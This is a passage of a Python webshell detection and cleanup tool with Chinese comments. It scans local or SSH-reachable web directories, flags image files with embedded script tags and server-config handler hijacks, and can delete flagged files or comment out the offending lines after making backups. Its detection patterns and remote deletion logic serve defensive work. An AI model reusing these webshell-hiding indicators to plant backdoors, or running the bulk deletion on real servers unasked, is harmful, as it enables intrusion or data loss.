            nonascii = sum(1 for c in head if c >= 0x80)
            if nonascii / len(head) > 0.35:
                score += 25
                hits.append("[高比例非ASCII]")

    if os.path.splitext(filename)[1].lower() in PIC_EXT:
        low = raw[:2048]
        if b"<?" in low or b"<%" in low or b"<jsp" in low:
            score += 150
            hits.append("[图片马:图片头含脚本标签]")
        else:
            # 纯图片，无脚本标签则直接判净
            return {
                "file": filename, "type": "PIC", "size": len(raw),
                "score": 0.0, "level": 0, "verdict": "clean", "hits": [],
                "hit_lines": [], "quarantined": 0, "quarantined_hits": 0,
                "active_hits": 0, "dispose_state": "none",
            }

    if lang == "PHP" and re.search(rb"\?>\s*\S", raw[:600]):
        score += 10

    if score >= threshold:
        verdict, level = "malicious", 3
    elif score >= threshold * SUSPECT_RATIO:
        verdict, level = "suspicious", 2
    else:
        verdict, level = "clean", 0

    # 命中行定位（供"注释危险代码"用；仅对非 clean 结果构建，避免无谓开销）
    hit_lines = collect_hit_lines(raw, hit_kws) if (level > 0 and hit_kws) else []
    # 处置状态：命中行里有几行已被注释过
    q_hits = sum(1 for h in hit_lines if h.get("quarantined"))
    active_hits = len(hit_lines) - q_hits
    if hit_lines and active_hits == 0:
        dispose_state = "quarantined"        # 命中行全部已注释
    elif q_hits:
        dispose_state = "partial"            # 部分已注释
    else:
        dispose_state = "none"

    return {
        "file": filename,
        "type": lang,
        "size": len(raw),
        "score": round(score, 1),
        "level": level,
        "verdict": verdict,
        "hits": hits[:14],
        "hit_lines": hit_lines,
        "quarantined": quarantined,
        "quarantined_hits": q_hits,
        "active_hits": active_hits,
        "dispose_state": dispose_state,
    }


# ==================================================================== 本地扫描
def scan_local(target, threshold=DEFAULT_THRESHOLD, workers=8, log_callback=print,
               auto_delete=False, extensions=None):
    """扫描本地目录或单个文件"""
    exts = extensions or set(TYPE_RULES.keys())
    tasks = []

    def _is_script(path):
        base = os.path.basename(path).lower()
        if base in HTACCESS_NAMES:
            return True
        ext = os.path.splitext(base)[1].lower()
        if ext.lstrip(".") in exts:
            return True
        return ext in PIC_EXT          # 图片也纳入(检测图片马)

    if os.path.isfile(target):
        tasks = [target]
    else:
        for dirpath, dirnames, filenames in os.walk(target):
            # 原地裁剪遍历：跳过排除目录(依赖/缓存/WAF 自身)
            dirnames[:] = [d for d in dirnames if d not in EXCLUDE_DIR_NAMES]
            for fn in filenames:
                full = os.path.join(dirpath, fn)
                if is_excluded_path(full):
                    continue
                if _is_script(fn):
                    tasks.append(full)

    log_callback(f"[*] 待扫描文件(脚本+配置+图片): {len(tasks)} 个")
    results = []

    def work(p):
        try:
            is_pic = os.path.splitext(p)[1].lower() in PIC_EXT
            limit = PIC_HEAD_BYTES if is_pic else MAX_REMOTE_FILE_SIZE
            with open(p, "rb") as f:
                raw = f.read(limit)
            return analyze_bytes(raw, p, threshold)
        except Exception as exc:
            log_callback(f"[!] 读取失败 {p}: {exc}")
            return None

    with ThreadPoolExecutor(max_workers=workers) as pool:
        for r in pool.map(work, tasks):
            if r and r["verdict"] != "clean":
                results.append(r)

    results.sort(key=lambda x: -x["score"])
    if auto_delete:
        for r in results:
            if r["verdict"] == "malicious":
                try:
                    os.remove(r["file"])
                    log_callback(colored(f"[x] 已删除: {r['file']}", "red"))
                except Exception as exc:
                    log_callback(f"[!] 删除失败 {r['file']}: {exc}")
    return results, len(tasks)


# ==================================================================== 远程扫描
def _build_find_clause():
    """构造 find 的 -name 条件：脚本扩展名 + .htaccess 类配置 + 图片(查图片马)"""
    parts = [f"-name '*.{e}'" for e in sorted(TYPE_RULES.keys()) if e != "htaccess"]
    parts += [f"-name '*.{e.lstrip('.')}'" for e in sorted(PIC_EXT)]
    parts += [f"-name '{n}'" for n in sorted(HTACCESS_NAMES)]
    return " -o ".join(parts)


def _remote_script_list(ssh_client, remote_dir, log_callback):
    """列出远端脚本文件与配置文件(已在 find 层排除依赖/缓存/WAF 自身目录)"""
    qdir = shlex.quote(remote_dir)
    clause = _build_find_clause()
    prune = " ".join(f"-not -path '*/{d}/*'" for d in sorted(EXCLUDE_DIR_NAMES))
    cmd = (f"find {qdir} {prune} -type f \\( {clause} \\) "
           f"-printf '%p|%s\\n' 2>/dev/null")
    out, err = ssh.run_ssh_command(ssh_client, cmd)
    files = []
    for line in (out or "").splitlines():
        line = line.strip()
        if not line or "|" not in line:
            continue
        path, _, size = line.rpartition("|")
        if is_excluded_path(path):      # 兜底：远端 find 版本差异时不漏排除
            continue
        try:
            sz = int(size)
        except ValueError:
            continue
        files.append((path, sz))
    return files


def _remote_grep_candidates(ssh_client, remote_dir, log_callback):
    """远端 grep 粗筛，返回候选文件集合(先缩小范围，减少拉取量)"""
    qdir = shlex.quote(remote_dir)
    include_args = " ".join(f"--include='*.{e}'" for e in sorted(TYPE_RULES.keys())
                            if e != "htaccess")
    cmd = (
        f"grep -rlE '{REMOTE_GREP_KEYWORDS}' {qdir} {include_args} 2>/dev/null; "
        f"grep -rlE 'AddType|AddHandler|SetHandler|auto_prepend_file|"
        f"application/x-httpd-php' {qdir} --include='.htaccess' "
        f"--include='.user.ini' --include='web.config' 2>/dev/null"
    )
    out, err = ssh.run_ssh_command(ssh_client, cmd)
    cands = set()
    for line in (out or "").splitlines():
        line = line.strip()
        if line:
            cands.add(line)
    return cands


def scan_remote(remote_dir="/var/www/html/", threshold=DEFAULT_THRESHOLD,
                log_callback=print, auto_delete=False, use_grep_prefilter=True):
    """SSH 远程扫描

    流程: find 列文件 -> grep 粗筛 -> SFTP 拉回候选 -> 本地精确判定 -> 可选删除
    """
    if not state_manager.is_ssh:
        log_callback("请先测试ssh连接")
        return [], 0

    started = time.time()
    ssh_client = None
    sftp_client = None
    try:
        ssh_client = ssh.connect_ssh_client()
        log_callback(f"[*] 扫描远端目录: {remote_dir}")
        files = _remote_script_list(ssh_client, remote_dir, log_callback)
        log_callback(f"[*] 发现脚本/配置文件 {len(files)} 个")

        # 配置文件与图片始终扫描，不参与粗筛(它们最容易藏马且总量可控)
        def _always_scan(p):
            base = os.path.basename(p).lower()
            return base in HTACCESS_NAMES or os.path.splitext(base)[1].lower() in PIC_EXT

        always = [f for f in files if _always_scan(f[0])]
        others = [f for f in files if not _always_scan(f[0])]

        if use_grep_prefilter and len(others) > FULL_SCAN_LIMIT:
            candidates = _remote_grep_candidates(ssh_client, remote_dir, log_callback)
            kept = [f for f in others if f[0] in candidates]
            log_callback(f"[*] 脚本文件较多({len(others)}>{FULL_SCAN_LIMIT})，启用粗筛: "
                         f"命中 {len(kept)} 个 + 配置/图片 {len(always)} 个(始终扫描)")
            files = _dedup_files(kept + always)
        else:
            log_callback(f"[*] 全量精确扫描 {len(files)} 个文件(未启用粗筛，避免漏报)")
            files = _dedup_files(files)

        sftp_client = ssh_client.open_sftp()
        results = []
        for path, size in files:
            is_pic = os.path.splitext(path)[1].lower() in PIC_EXT
            limit = PIC_HEAD_BYTES if is_pic else MAX_REMOTE_FILE_SIZE
            if not is_pic and size > MAX_REMOTE_FILE_SIZE:
                log_callback(f"[!] 跳过超大文件({size}B): {path}")
                continue
            try:
                with sftp_client.open(path, "rb") as fh:
                    raw = fh.read(limit)
            except Exception as exc:
                log_callback(f"[!] 读取失败 {path}: {exc}")
                continue
            r = analyze_bytes(raw, path, threshold)
            if r and r["verdict"] != "clean":
                results.append(r)

        results.sort(key=lambda x: -x["score"])

        if auto_delete and results:
            to_del = [r["file"] for r in results if r["verdict"] == "malicious"]
            if to_del:
                log_callback(colored(f"[*] 准备删除 {len(to_del)} 个恶意文件...", "red"))
                for i in range(0, len(to_del), 50):
                    batch = to_del[i:i + 50]
                    q = " ".join(shlex.quote(p) for p in batch)
                    ssh.run_ssh_command(ssh_client, f"rm -f {q} 2>/dev/null")
                for p in to_del:
                    log_callback(colored(f"[x] 已删除: {p}", "red"))

        log_callback(f"[*] 扫描完成，耗时 {time.time() - started:.2f}s，"
                     f"可疑 {len(results)} 个 (扫描 {len(files)} 个文件)")
        return results, len(files)
    except Exception as exc:
        log_callback(f"[x] 远程扫描失败: {exc}")
        return [], 0
    finally:
        try:
            if sftp_client:
                sftp_client.close()
        except Exception:
            pass
        try:
            if ssh_client:
                ssh_client.close()
        except Exception:
            pass


def _dedup_files(files):
    seen = set()
    out = []
    for p, s in files:
        if p in seen:
            continue
        seen.add(p)
        out.append((p, s))
    return out


# ============================================================ 危险代码注释(处置)
# 设计要点：
#   1. 只注释"命中行"，不碰文件其余部分
#   2. 若该行含脚本开标签(<?php / <% / <?)，注释符插到标签**之后** ——
#      否则在 HTML 上下文中 // 只是普通文本，起不到注释作用
#   3. 无法安全注释的形态(<?= 短标签、<%@ 指令、闭合标签独占行)一律跳过并报告，
#      宁可不动也不把文件改坏
LANG_COMMENT_MARK = {
    "PHP": "//", "ASP": "'", "ASPX": "//", "JSP": "//",
    "JS": "//", "HTACCESS": "#",
}

# 脚本开标签：<?php / <? / <% ；单独识别 <?= 与 <%@ 这两种不可行注释的形态
_SCRIPT_OPEN_RE = re.compile(rb"<\?(?:php|=)?|<%")
_SCRIPT_UNSAFE_RE = re.compile(rb"<\?=|<%[@=]")
_SCRIPT_CLOSE_RE = re.compile(rb"\?>")


def comment_out_line(raw_line, lang):
    """把一行代码注释掉。

    返回 (新行 bytes, 是否改动 bool, 说明 str)
    """
    if isinstance(raw_line, str):
        raw_line = raw_line.encode("utf-8", "replace")
    mark = LANG_COMMENT_MARK.get(lang, "//")
    mkb = mark.encode()

    stripped = raw_line.lstrip()
    if not stripped.strip():
        return raw_line, False, "空行"
    # 本工具已注释过（隔离标记优先判定：注释符可能插在 <?php 之后而非行首）
    if _QUARANTINE_TAG_B in raw_line:
        return raw_line, False, "已注释(本工具隔离标记)"
    # 已是注释则不动
    if stripped.startswith((b"//", b"#", b"/*", b"<!--")) or (
            lang == "ASP" and stripped.startswith(b"'")):
        return raw_line, False, "已是注释"
    # 不可安全行注释的形态
    if _SCRIPT_UNSAFE_RE.search(raw_line):
        return raw_line, False, "含 <?= 短标签或 <%@ 指令，需手工处理"

    m = _SCRIPT_OPEN_RE.search(raw_line)
    if m:
        pos = m.end()
        head = raw_line[:pos]
        tail = raw_line[pos:]
        return (head + b" " + mkb + b" " + QUARANTINE_TAG.encode() + b" "
                + tail), True, "开标签后插入行注释"

    # 无开标签：若本行含闭合标签 ?>，说明处在 PHP 块中间，
    # 行首插入 // 会把 ?> 也注释掉导致后续内容被当 PHP 解析 —— 跳过
    if _SCRIPT_CLOSE_RE.search(raw_line):
        return raw_line, False, "无开标签但含 ?> 闭合标签，需手工处理"

    indent_len = len(raw_line) - len(stripped)
    return (raw_line[:indent_len] + mkb + b" " + QUARANTINE_TAG.encode() + b" "
            + stripped), True, "行首插入行注释"


def _read_target(path, sftp_client=None, limit=None):
    """读文件内容（本地或远端），远端走 SFTP"""
    if sftp_client is not None:
        with sftp_client.open(path, "rb") as fh:
            return fh.read(limit) if limit else fh.read()
    with open(path, "rb") as fh:
        return fh.read(limit) if limit else fh.read()


def _write_target(path, data, sftp_client=None):
    """写回文件（本地：临时文件+原子替换；远端：SFTP 覆盖写）"""
    if sftp_client is not None:
        with sftp_client.open(path, "wb") as fh:
            fh.write(data)
        return
    tmp = path + ".metawd.tmp"
    with open(tmp, "wb") as fh:
        fh.write(data)
    os.replace(tmp, path)


def build_quarantine_plan(results, log_callback=print, sftp_client=None):
    """为检测结果生成"待注释行"计划（只读，不修改文件）。

    仅处理 level==3(恶意) 的结果；level==2(可疑) 一律跳过 ——
    可疑项存在误报可能，自动注释会误伤正常业务代码。

    返回 [{"file","type","score","lines":[{"line","kw","text","new_text","action","ok"}]}]
    """
    plan = []
    skipped_suspect = []
    for r in results:
        level = r.get("level", 0)
        if level < 3:
            if level == 2:
                skipped_suspect.append(r["file"])
            continue
        if not r.get("hit_lines"):
            log_callback(f"[!] {r['file']}: 未取得命中行(命中来自组合规则)，跳过")
            continue

        path = r["file"]
        try:
            raw = _read_target(path, sftp_client, MAX_REMOTE_FILE_SIZE)
        except Exception as exc:
            log_callback(f"[!] 读取失败 {path}: {exc}")
            continue

        lines = raw.split(b"\n")
        entries = []
        for hl in r["hit_lines"]:
            ln = hl["line"]
            if ln < 1 or ln > len(lines):
                continue
            old = lines[ln - 1]
            new, changed, note = comment_out_line(old, r.get("type", "PHP"))
            entries.append({
                "line": ln,
                "kw": hl["kw"],
                "text": old.decode("utf-8", "replace").rstrip("\r")[:300],
                "new_text": new.decode("utf-8", "replace").rstrip("\r")[:300],
                "action": note,
                "ok": changed,
                # 内部字段：保留原始字节，写回时按字节替换，
                # 避免 GBK 等非 UTF-8 文件被二次编解码损坏
                "_old_bytes": old,
                "_new_bytes": new,
            })
        actionable = [e for e in entries if e["ok"]]
        if not actionable:
            log_callback(f"[!] {path}: 无可安全注释的行，跳过")
            continue
        plan.append({
            "file": path,
            "type": r.get("type", "?"),
            "score": r.get("score", 0),
            "lines": entries,
        })

    if skipped_suspect:
        log_callback(f"[*] 跳过 {len(skipped_suspect)} 个「可疑」文件"
                     f"(仅对判定为「恶意」的文件执行注释)")
    for p in plan:
        n_ok = sum(1 for e in p["lines"] if e["ok"])
        n_skip = len(p["lines"]) - n_ok
        log_callback(f"[*] 计划注释 {p['file']}  可注释 {n_ok} 行"
                     + (f"，{n_skip} 行不可自动处理" if n_skip else ""))
    return plan


def apply_quarantine(plan, log_callback=print, backup=True, sftp_client=None):
    """执行注释计划，写回前自动备份，返回统计信息。

    备份统一命名为「<原文件>.<时间戳>.bak」放在同目录：
      * 本地/远端行为一致，便于回滚
      * .bak 不会被 web 服务器当脚本执行，也不影响业务

    返回 {"files":n, "lines":n, "backups":[...], "failed":[...]}
    """
    stats = {"files": 0, "lines": 0, "backups": [], "failed": []}
    if not plan:
        log_callback("[*] 没有需要处理的文件")
        return stats

    stamp = time.strftime("%Y%m%d-%H%M%S")
    for item in plan:
        path = item["file"]
        try:
            raw = _read_target(path, sftp_client)
        except Exception as exc:
            stats["failed"].append((path, f"读取失败: {exc}"))
            continue

        lines = raw.split(b"\n")
        changed = 0
        for e in item["lines"]:
            if not e["ok"]:
                continue
            idx = e["line"] - 1
            if idx < 0 or idx >= len(lines):
                stats["failed"].append((path, f"第{e['line']}行已不存在(文件被改动?)"))
                continue
            # 写回前校验：该行内容与生成计划时一致才替换，避免误改
            old_bytes = e.get("_old_bytes")
            if old_bytes is not None and lines[idx] != old_bytes:
                stats["failed"].append((path, f"第{e['line']}行内容已变化，跳过"))
                log_callback(f"[!] {path} 第{e['line']}行内容与扫描时不一致，跳过该行")
                continue
            lines[idx] = e["_new_bytes"]
            changed += 1
        if not changed:
            continue

        # 备份（本地/远端统一命名，失败则放弃修改该文件）
        if backup:
            try:
                if sftp_client is not None:
                    bpath = "%s.%s.bak" % (path, stamp)
                else:
                    bpath = "%s.%s.bak" % (path, stamp)
                _write_target(bpath, raw, sftp_client)
                stats["backups"].append(bpath)
            except Exception as exc:
                log_callback(f"[!] 备份失败，已跳过修改 {path}: {exc}")
                stats["failed"].append((path, f"备份失败: {exc}"))
                continue

        try:
            _write_target(path, b"\n".join(lines), sftp_client)
            stats["files"] += 1
            stats["lines"] += changed
            log_callback(colored(f"[+] 已注释 {changed} 行: {path}", "yellow"))
        except Exception as exc:
            stats["failed"].append((path, f"写回失败: {exc}"))
            log_callback(f"[!] 写回失败 {path}: {exc}")

    return stats


def format_quarantine_plan(plan):
    """把计划格式化成可读文本，用于确认对话框/日志"""
    out = []
    total_lines = sum(1 for p in plan for e in p["lines"] if e["ok"])
    out.append(f"待处理文件 {len(plan)} 个，待注释行 {total_lines} 行")
    out.append("-" * 70)
    for p in plan:
        out.append(f"[{p['type']}] {p['file']}   (score {p['score']})")
        for e in p["lines"]:
            flag = "注释" if e["ok"] else "跳过"
            out.append(f"   L{e['line']:<5} [{flag}] {e['text'][:100]}")
            if e["ok"]:
                out.append(f"          -> {e['new_text'][:100]}")
            else:
                out.append(f"          原因: {e['action']}")
    return "\n".join(out)


# ==================================================================== 报告输出
def format_report(results, total, threshold=DEFAULT_THRESHOLD):
    """把扫描结果格式化成文本报告

    已处置过的命中会带 [已注释] / [部分已注释] 前缀 —— 复扫时这些文件
    依然会报出来，只是让使用者一眼看出"木马代码还在，但已经被注释掉了"。
    """
    lines = []
    lines.append("=" * 78)
    lines.append(f"  WebShell 查杀报告   扫描 {total} 个文件，"
                 f"命中 {len(results)} 个，阈值 {threshold}")
    lines.append("=" * 78)
    if not results:
        lines.append("  未发现可疑文件")
        return "\n".join(lines)
    for r in results:
        mark = "【恶意】" if r["verdict"] == "malicious" else "【可疑】"
        state = r.get("dispose_state", "none")
        if state == "quarantined":
            tag = "[已注释] "
        elif state == "partial":
            tag = "[部分已注释] "
        else:
            tag = ""
        lines.append(f"{tag}{mark} level={r['level']} score={r['score']:<8} "
                     f"{r['type']:<4} {r['file']}")
        if r["hits"]:
            lines.append(f"        命中: {' | '.join(r['hits'])}")
        if r.get("hit_lines"):
            for h in r["hit_lines"][:6]:
                flag = "已注释" if h.get("quarantined") else "未处置"
                lines.append(f"        L{h['line']:<5}[{flag}] {h['text'][:90]}")
    mal = sum(1 for r in results if r["verdict"] == "malicious")
    sus = len(results) - mal
    q = sum(1 for r in results if r.get("dispose_state") == "quarantined")
    lines.append("-" * 78)
    lines.append(f"  合计: 恶意 {mal} 个，可疑 {sus} 个"
                 + (f"，其中已注释处置 {q} 个" if q else ""))
    return "\n".join(lines)


def save_report(results, total, out_path=None, threshold=DEFAULT_THRESHOLD):
    """保存报告到运行目录(打包后为 exe 旁边的 tmp/<host>/)"""
    text = format_report(results, total, threshold)
    if out_path is None:
        safe_host = re.sub(r"[^A-Za-z0-9_.-]", "_", state_manager.hostname or "default")
        out_dir = get_runtime_dir(safe_host)
        out_dir.mkdir(parents=True, exist_ok=True)
        out_path = out_dir / f"webshell_report_{time.strftime('%Y%m%d_%H%M%S')}.txt"
    try:
        with open(out_path, "w", encoding="utf-8") as f:
            f.write(text)
        return str(out_path)
    except Exception:
        return None
